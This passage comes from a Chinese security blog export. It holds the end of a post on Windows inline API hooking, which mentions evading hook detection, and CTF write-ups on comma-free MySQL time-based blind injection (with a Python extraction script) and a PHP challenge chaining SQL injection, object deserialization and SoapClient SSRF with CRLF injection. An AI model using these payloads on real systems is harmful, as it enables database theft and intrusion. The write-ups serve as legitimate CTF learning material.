<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> VOID <span class="title">Freeze</span><span class="params">(PFROZEN_THREADS pThreads, UINT pos, UINT action)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pThreads-&gt;pItems   = <span class="literal">NULL</span>;</span><br><span class="line">    pThreads-&gt;capacity = <span class="number">0</span>;</span><br><span class="line">    pThreads-&gt;<span class="built_in">size</span>     = <span class="number">0</span>;</span><br><span class="line">    EnumerateThreads(pThreads);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pThreads-&gt;pItems != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        UINT i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pThreads-&gt;<span class="built_in">size</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            HANDLE hThread = OpenThread(THREAD_ACCESS, FALSE, pThreads-&gt;pItems[i]);</span><br><span class="line">            <span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                SuspendThread(hThread);</span><br><span class="line">                ProcessThreadIPs(hThread, pos, action);</span><br><span class="line">                CloseHandle(hThread);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟踪一下<code>ProcessThreadIPs</code>函数的操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ProcessThreadIPs</span><span class="params">(HANDLE hThread, UINT pos, UINT action)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// If the thread suspended in the overwritten area,</span></span><br><span class="line">    <span class="comment">// move IP to the proper address.</span></span><br><span class="line"></span><br><span class="line">    CONTEXT c;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">    DWORD64 *pIP = &amp;c.Rip;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    DWORD   *pIP = &amp;c.Eip;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    UINT count;</span><br><span class="line"></span><br><span class="line">    c.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">    <span class="keyword">if</span> (!GetThreadContext(hThread, &amp;c))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos == ALL_HOOKS_POS)</span><br><span class="line">    &#123;</span><br><span class="line">        pos = <span class="number">0</span>;</span><br><span class="line">        count = g_hooks.<span class="built_in">size</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        count = pos + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; pos &lt; count; ++pos)</span><br><span class="line">    &#123;</span><br><span class="line">        PHOOK_ENTRY pHook = &amp;g_hooks.pItems[pos];</span><br><span class="line">        BOOL        enable;</span><br><span class="line">        DWORD_PTR   ip;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (action)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> ACTION_DISABLE:</span><br><span class="line">            enable = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> ACTION_ENABLE:</span><br><span class="line">            enable = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">// ACTION_APPLY_QUEUED</span></span><br><span class="line">            enable = pHook-&gt;queueEnable;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pHook-&gt;isEnabled == enable)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (enable)</span><br><span class="line">            ip = FindNewIP(pHook, *pIP);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ip = FindOldIP(pHook, *pIP);</span><br><span class="line">        <span class="keyword">if</span> (ip != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *pIP = ip;</span><br><span class="line">            SetThreadContext(hThread, &amp;c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>emm，这里直接修改了其他线程的Eip，操作有点秀啊。。。。。</p>
<p>接下来就是恢复线程的操作了,不在细说。</p>
<h3 id="0x4-Hook之后的调用过程"><a href="#0x4-Hook之后的调用过程" class="headerlink" title="0x4 Hook之后的调用过程"></a>0x4 Hook之后的调用过程</h3><p>就以实例代码中的Hook<code>MessageBoxW</code>的调用过程为例，以下图展示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                                                              DetourMessageBoxW</span><br><span class="line">                                          ^------------&gt;+------------------ --- --+</span><br><span class="line">        +--------------------+            |             |    push ebp             |</span><br><span class="line">        |  <span class="comment">// user code      |            |             |    mov ebp,esp          |</span></span><br><span class="line">      +-+   call MessageBoxW |            |             |    ......               |</span><br><span class="line">      | +--------------------+            |             |    ;your code           |</span><br><span class="line">      |                                   |             |    .....                |</span><br><span class="line">      |                                   |             |    call fpMessage oxW   +--+</span><br><span class="line">      |                                   |             +------------------ --- --+  |</span><br><span class="line">      |                                   |                                          |</span><br><span class="line">      v        origin MessageBoxW         |                   fpMessageBoxW          |</span><br><span class="line">+-----+------------------------------+    |            +--------------------------+&lt;-+</span><br><span class="line">|    <span class="number">0xe9</span> address_D tourMessageBoxW  +----+            |                          |</span><br><span class="line">|          .......other code......   |                 |    ; origin <span class="number">5</span> bytes      |</span><br><span class="line">+------------------------------------+&lt;--^|            |    ; of MesageBoxW       |</span><br><span class="line">                                          |            |                          |</span><br><span class="line">                                          +------------|    jmp MessageBoxW+<span class="number">5</span>     |</span><br><span class="line">                                                       +--------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="0x5-需要改进的地方"><a href="#0x5-需要改进的地方" class="headerlink" title="0x5 需要改进的地方"></a>0x5 需要改进的地方</h3><p>因为想做不被执行程序感知的Hook，这里明显的问题是，被Hook的系统API的第一条指令都是<code>0xe9...</code>很容易被发现。另外一个问题是这里没有对栈做处理，导致也可以通过<code>unblance stack</code>技巧轻易发现API被Hook过。</p>
<p>所以接下来的工作就是修改这个两个地方。</p>
]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>windows</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql无逗号的注入技巧</title>
    <url>/2016/05/31/mysql%E6%97%A0%E9%80%97%E5%8F%B7%E7%9A%84%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>明天就要考试了，然而我还在任性的写代码，真是该剁手，剁手啊…</p>
<a id="more"></a>
<p>在一个 ctf比赛中，遇到这样一个注入题：</p>
<p>用户的ip可以用x-forwarded-for来伪造，然后把ip存储到数据库中去，对ip没有进行任何过滤，存在注入，但是有一个限制就是:  用‘,’逗号对ip地址进行分割，仅仅取逗号前面的第一部分内容。</p>
<p>然后：没有报错，没有回显，没有bool，只有延时。 送一个字，坑。。。。。</p>
<p>比赛的时候，就各种纠结，想着怎么绕过逗号，没想出来，比赛结束之后，仔细想想，终于搞明白了，做以下的总结。</p>
<p>据我猜测，后台代码可能是这样的：</p>
<p>[php]</p>
<?php
error_reporting(0);

function getIp(){
    $ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
     $ip = $_SERVER['REMOTE_ADDR'];
}
   $ip_arr = explode(',', $ip);
   return $ip_arr[0];
}

$host="localhost";
$user="root";
$pass="root";
$db="sangebaimao";

$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

mysql_select_db($db) or die("Unable to select database");

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);


?>
<p>[/php]</p>
<p>写一下我的数据库的表结构：</p>
<p>[sql]<br>CREATE TABLE IF NOT EXISTS <code>client_ip</code> (<br> <code>id</code> int(11) NOT NULL AUTO_INCREMENT,<br> <code>ip</code> varchar(200) DEFAULT NULL,<br> PRIMARY KEY (<code>id</code>)<br>) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=34 ;</p>
<p>CREATE TABLE IF NOT EXISTS <code>flag</code> (<br> <code>flag</code> varchar(32) DEFAULT NULL<br>) ENGINE=MyISAM DEFAULT CHARSET=gbk;</p>
<p>INSERT INTO <code>flag</code> (<code>flag</code>) VALUES<br>(‘327a6c4304ad5938eaf0efb6cc3e53dc’);<br>[/sql]</p>
<p>我的目标是注出来flag表中的flag字段。</p>
<p>分析一下：</p>
<p>因为没有报错，没有回显。所以只能是延时盲注。</p>
<p>测试一下：</p>
<p>[python]<br>x-forwarded-for: 10.20.0.12’+sleep(5) and ‘1’=’1</p>
<p>[/python]</p>
<p>果真延时了，注入是存在的，但是怎么出数据呢？？？<br>没有逗号，所以if函数就不能用了。<br>那用另外一个：</p>
<p>[sql]<br>select case when (条件) then 代码1 else 代码 2 end<br>[/sql]</p>
<p>把判断搞定了，但是怎么截取字符串呢？ 截取字符串函数貌似都需要逗号啊！！！</p>
<p>百度了好久，才知道可以这样玩：</p>
<p>[sql]<br> select substring((select user()) from 1 for 1);  #第一种方法<br> select substring((select user()) from -1);  #第二种方法<br>[/sql]</p>
<img class="alignnone size-full wp-image-452" src="/uploads/2016/05/QQ截图20160531142402.png" alt="QQ截图20160531142402" width="602" height="251" />

<p>截取字符串的函数有了，判断也有了。那就搞定了：</p>
<p>找到两种payload</p>
<p>[sql]</p>
<p>insert into client_ip (ip) values (‘ip’+(select case when (substring((select user()) from 1 for 1)=’e’) then sleep(3) else 0 end));  –第一种payload</p>
<p>insert into client_ip (ip) values (‘ip’+(select case when (substring((select  user()) from -1)=’t’) then sleep(3) else 0 end));  –第二种payload</p>
<p>[/sql]</p>
<p>接下来就是写个脚本跑了：</p>
<p>[python]<br>#coding:utf-8<br>import requests<br>maystr=”0987654321qwertyuiopasdfghjklzxcvbnm”<br>url=”<a href="http://127.0.0.1/sql/sql.php&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql/sql.php&quot;</a><br>flag=””<br>for i in range(32):<br>   for str in maystr:<br>     headers={“x-forwarded-for”:”127.0.0.1’+”+”(select case when (substring((select flag from flag ) from %d for 1 )=’%s’) then sleep(6) else sleep(0) end ) and ‘1’=’1”%(i+1,str)}</p>
<h1 id="proxy-“http”-”http-127-0-0-1-8080-quot"><a href="#proxy-“http”-”http-127-0-0-1-8080-quot" class="headerlink" title="proxy={“http”:”http://127.0.0.1:8080&quot;}"></a>proxy={“http”:”<a href="http://127.0.0.1:8080&quot;}">http://127.0.0.1:8080&quot;}</a></h1><h1 id="res-requests-get-url-headers-headers-timeout-3"><a href="#res-requests-get-url-headers-headers-timeout-3" class="headerlink" title="res=requests.get(url,headers=headers,timeout=3)"></a>res=requests.get(url,headers=headers,timeout=3)</h1><pre><code>try: 
    res=requests.get(url,headers=headers,timeout=4)
except requests.exceptions.ReadTimeout,e:
    flag=flag+str
    print &quot;flag:&quot;,flag
    break 
except KeyboardInterrupt,e:
   exit(0)
else:
   pass</code></pre><h1 id="rint-i-1-str"><a href="#rint-i-1-str" class="headerlink" title="rint i+1,str"></a>rint i+1,str</h1><p>[/python]</p>
<p>再增加一种绕过逗号的姿势，比如说：</p>
<p>[sql]</p>
<p>select id,ip from client_ip where 1&gt;2  union select * from  ( (select user())a JOIN  (select version())b );  –这个用于union 查询的注入</p>
<p>[/sql]</p>
<img class="alignnone size-full wp-image-455" src="/uploads/2016/05/QQ截图20160531151817.png" alt="QQ截图20160531151817" width="1035" height="166" />

<p>&nbsp;</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>sql inject</tag>
      </tags>
  </entry>
  <entry>
    <title>N1CTF hard PHP Writeup</title>
    <url>/2018/03/13/n1ctf-hard-php-writeup/</url>
    <content><![CDATA[<p>这个题目非常的有意思，做题的时候真的感觉到了php有多硬（hard被我强行翻译为硬）。</p>
<p>题目的代码和部署环境都在<a href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499" target="_blank" rel="noopener">这里</a>，比赛的时候没时间做的还有机会去看。</p>
<a id="more"></a>
<h3 id="0x1-代码审计，发现漏洞"><a href="#0x1-代码审计，发现漏洞" class="headerlink" title="0x1 代码审计，发现漏洞"></a>0x1 代码审计，发现漏洞</h3><p>首先是源码泄露，下载到所有的代码，就不用说了。另外还给了docker的部署环境。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> andreisamuilik/php5.<span class="number">5.9</span>-apache2.<span class="number">4</span>-mysql5.<span class="number">5</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> nu1lctf.tar.gz /app/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> a2enmod rewrite</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sql.sql /tmp/sql.sql</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> run.sh /run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /home/nu1lctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> clean_danger.sh /home/nu1lctf/clean_danger.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /tmp/sql.sql</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 555 /home/nu1lctf/clean_danger.sh</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"/run.sh"</span>]</span></span><br></pre></td></tr></table></figure>

<p>php的版本是5.5.9,比较老。</p>
<p>先在<code>config.php</code>看到了全局过滤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_deep'</span>, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addsla_all</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</span><br><span class="line">        &#123;</span><br><span class="line">            $_GET  = addslashes_deep($_GET);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">        &#123;</span><br><span class="line">            $_POST = addslashes_deep($_POST);</span><br><span class="line">        &#125;</span><br><span class="line">        $_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">        $_REQUEST  = addslashes_deep($_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">addsla_all();</span><br></pre></td></tr></table></figure>

<p>这样过滤之后，简单的注入就不存在了。</p>
<p>在<code>user.php</code>中看到<code>insert</code>函数，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span><span class="params">($columns)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($columns))</span><br><span class="line">            $column = <span class="string">' `'</span>.implode(<span class="string">'`,`'</span>,$columns).<span class="string">'` '</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $column = <span class="string">' `'</span>.$columns.<span class="string">'` '</span>;</span><br><span class="line">        <span class="keyword">return</span> $column;</span><br><span class="line">    &#125;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">        $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">        $nid =</span><br><span class="line">        $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看对<code>$value</code>的操作，先将<code>$value</code>数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="variable">$value</span>[0]`</span>,<span class="string">`<span class="variable">$value</span>[1]`</span>，<span class="string">`<span class="variable">$value</span>[1]`</span></span><br></pre></td></tr></table></figure>

<p>然后再执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br></pre></td></tr></table></figure>

<p>核心操作是如果一对反引号中间的内容不存在逗号和反引号，就把反引号变为单引号,所以<code>$value</code>就变为了</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="symbol">'$value</span>[<span class="name">0</span>]',<span class="symbol">'$value</span>[<span class="name">1</span>]<span class="symbol">'，</span><span class="symbol">'$value</span>[<span class="name">1</span>]')</span><br></pre></td></tr></table></figure>

<p>但是如果<code>$value</code>元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说:</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">考虑$value为 : array(<span class="string">"admin`,`1`)#"</span>,<span class="string">"password"</span>)</span><br><span class="line">经过处理后，就变为了 : (<span class="string">'admin'</span>,<span class="string">'1'</span>)<span class="meta">#`,<span class="string">'password'</span> )</span></span><br><span class="line">相当于闭合了单引号，造成注入。</span><br></pre></td></tr></table></figure>

<p>看到<code>insert</code>函数在<code>publish</code>函数中被调用，并且存在<code>$_POST[&#39;signature&#39;]</code>变量可控，注入点就在这里：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br></pre></td></tr></table></figure>

<h3 id="0x2-通过注入拿到管理员密码"><a href="#0x2-通过注入拿到管理员密码" class="headerlink" title="0x2 通过注入拿到管理员密码"></a>0x2 通过注入拿到管理员密码</h3><p><strong>开始是这样想的</strong></p>
<p>写注入payload的部分是在 <code>$mood</code>中,这是一个序列化后的<code>Mood</code>类,好像没法直接出数据，用盲注又太麻烦，但是因为mysql的insert可以一次插入多条数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (<span class="string">`username`</span>,<span class="string">`password`</span>) <span class="keyword">values</span> (<span class="string">'user1'</span>,<span class="string">'pass1'</span>),(<span class="string">'user2'</span>,<span class="string">'pass2'</span>)</span><br></pre></td></tr></table></figure>

<p>所以这里可以通过<code>$_POST[&#39;signature&#39;]</code>一直往后覆盖，把输出点放到下一条数据的的<code>$_POST[&#39;signature&#39;]</code>字段，但是问题来了，我不知道自己的<code>userid</code>,插入进去也看不到啊。。（因为我没发现竟然可以包含session，包含session之后就看到<code>userid</code>了，这是一种思路).下面是我当时的做法。</p>
<p><strong>我的做法</strong></p>
<p>我看了看代码之后，发现其实 <code>Mood</code>本身就有输出点的，在<code>views/index</code>页面:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> htmlentities($data[<span class="string">'data'</span>][$i][<span class="string">'sig'</span>]).<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">$mood = (int)$data[<span class="string">'data'</span>][$i][<span class="string">'mood'</span>][<span class="string">'mood'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='img/$mood.gif'&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"published "</span>.$data[<span class="string">'data'</span>][$i][<span class="string">'subtime'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p><code>Mood</code>类的<code>mood</code>参数被直接输出到页面中了,但是需要注意的是进行了一个int类型的转换,如果可以伪造<code>Mood</code>类的<code>mood</code>属性就可以了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mode = <span class="keyword">new</span> Mood((int)<span class="string">"1"</span>,<span class="string">"114.114.114.114"</span>);</span><br><span class="line">$mode-&gt;data = <span class="string">"0"</span>;  <span class="comment">// 把data设置为0，可以直观的从页面的publish time中看到注入的数据是否被成功反序列化</span></span><br><span class="line"><span class="keyword">echo</span> serialize($mode);</span><br><span class="line"><span class="comment">//O:4:"Mood":4:&#123;s:4:"mood";i:1;s:2:"ip";s:15:"114.114.114.114";s:4:"date";i:1520912184;s:4:"data";s:1:"0";&#125;</span></span><br></pre></td></tr></table></figure>

<p>现在来解决整型的问题，因为在php中,最大的整型是8个字节，所以有32个字节的数据，分四次读出，每次8个字节，转化为10进制。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> dechex(PHP_INT_MAX);</span><br><span class="line"><span class="number">7</span>fffffffffffffff</span><br></pre></td></tr></table></figure>

<p>最后注入的payload为：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">signature=username`,concat(`O:<span class="number">4</span>:<span class="string">"Mood"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"mood"</span>;i:`,(select conv(hex((select mid((select password <span class="keyword">from</span> ctf_users where is_admin=<span class="number">1</span> ),<span class="number">1</span>,<span class="number">8</span>))),<span class="number">16</span>,<span class="number">10</span>)),`;s:<span class="number">2</span>:<span class="string">"ip"</span>;s:<span class="number">15</span>:<span class="string">"114.114.114.114"</span>;s:<span class="number">4</span>:<span class="string">"date"</span>;s:<span class="number">1</span>:<span class="string">"0"</span>;&#125;`))#&amp;mood=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="http://pic.wonderkun.cc/uploads/2018/03/1.png" alt="http://pic.wonderkun.cc/uploads/2018/03/1.png"></p>
<p>然后访问首页就可以看到有这样的一个请求：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/03/2.png" alt="http://pic.wonderkun.cc/uploads/2018/03/2.png"></p>
<p>然后再mysql中执行:</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select unhex(conv("3617854171513108786",10,16));</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| unhex(conv("3617854171513108786",10,16)) |</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| 2533f492                                 |</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br></pre></td></tr></table></figure>

<p>求出前八位，然后依次类推求出后面的24位，最后解密的得到管理员的账号密码为：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">admin:</span>nu1ladmin</span><br></pre></td></tr></table></figure>

<h3 id="0x3-巧妙的构造SSRF-神来之笔"><a href="#0x3-巧妙的构造SSRF-神来之笔" class="headerlink" title="0x3 巧妙的构造SSRF-神来之笔"></a>0x3 巧妙的构造SSRF-神来之笔</h3><p>拿到管理员账号密码之后，发现有ip限制，不能登录。然后题目放出提示说要SSRF。</p>
<p>代码就这么点，哪有SSRF啊？思路一致跑偏，以为是服务器上其他的软件漏洞导致的SSRF，无果。</p>
<p>再仔细想想，我们目前的漏洞其实有两个了：</p>
<ol>
<li>sql注入</li>
<li>伪造任意的php内置类</li>
</ol>
<p>然后受到<a href="http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault" target="_blank" rel="noopener">http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault</a>这个题目的影响，一直在想php的其他内置类是否有跟<code>Mood</code>类一样的方法，这显然是不现实的，没有可能那个内置类会有<code>getcountry</code>这样的方法。后来在跟队友的讨论中想到了php的<code>__call</code>的魔术方法 ：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/03/3.png" alt="http://pic.wonderkun.cc/uploads/2018/03/3.png"></p>
<p>也就是说，在调用一个类的不可访问的方法的时候，就会去调用<code>__call</code>方法。</p>
<p>所以我们只需要找到一个类，重载了__call方法，并且可以发请求的就可以了,然后找到了<code>soapClient</code>这个类：</p>
<p>示例如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$client = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1:9999"</span>,</span><br><span class="line">                                     <span class="string">'uri'</span>      =&gt; <span class="string">"http://test-uri/"</span>));</span><br><span class="line">$se = serialize($client); </span><br><span class="line">var_dump($se);</span><br><span class="line">$unse = unserialize($se);</span><br><span class="line">$unse -&gt; getcountry();</span><br></pre></td></tr></table></figure>

<p>然后就会发现发送了下面的一个数据包：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9999</span></span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/<span class="number">5.5</span><span class="number">.9</span><span class="number">-1</span>ubuntu4<span class="number">.11</span></span><br><span class="line">Content-Type: text/xml; charset=utf<span class="number">-8</span></span><br><span class="line">SOAPAction: <span class="string">"http://test-uri/#getcountry"</span></span><br><span class="line">Content-Length: <span class="number">386</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="string">"http://test-uri/"</span> xmlns:xsd=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:getcountry/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>这样我们就有了SSRF，可以发请求了。我们需要的是用SSRF来登录管理员账号，这里的soapClient只可以用来发送xml的数据，而且<code>Content-Type</code>也不符合要求，那怎么办呢？ </p>
<h3 id="0x4-CRLF来助攻，伪造登录请求"><a href="#0x4-CRLF来助攻，伪造登录请求" class="headerlink" title="0x4 CRLF来助攻，伪造登录请求"></a>0x4 CRLF来助攻，伪造登录请求</h3><p>根据我的测试，soapClient存在CRLF的参数有两个,一个是<code>user_agent</code>,一个是<code>uri</code>。</p>
<p>测试代码如下：</p>
<p><strong>user_agent</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$location = <span class="string">"http://127.0.0.1:9999/2.php?action=login"</span>;</span><br><span class="line">$uri = <span class="string">"http://127.0.0.1/"</span>;</span><br><span class="line">$event = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\ntest:test"</span>,<span class="string">'location'</span>=&gt;$location,<span class="string">'uri'</span>=&gt;$uri));</span><br><span class="line">$event-&gt;getcountry();</span><br><span class="line"></span><br><span class="line"><span class="comment">//收到的请求为</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">POST /2.php?action=login HTTP/1.1</span></span><br><span class="line"><span class="comment">Host: 127.0.0.1:9999</span></span><br><span class="line"><span class="comment">Connection: Keep-Alive</span></span><br><span class="line"><span class="comment">User-Agent: test</span></span><br><span class="line"><span class="comment">test:test</span></span><br><span class="line"><span class="comment">Content-Type: text/xml; charset=utf-8</span></span><br><span class="line"><span class="comment">SOAPAction: 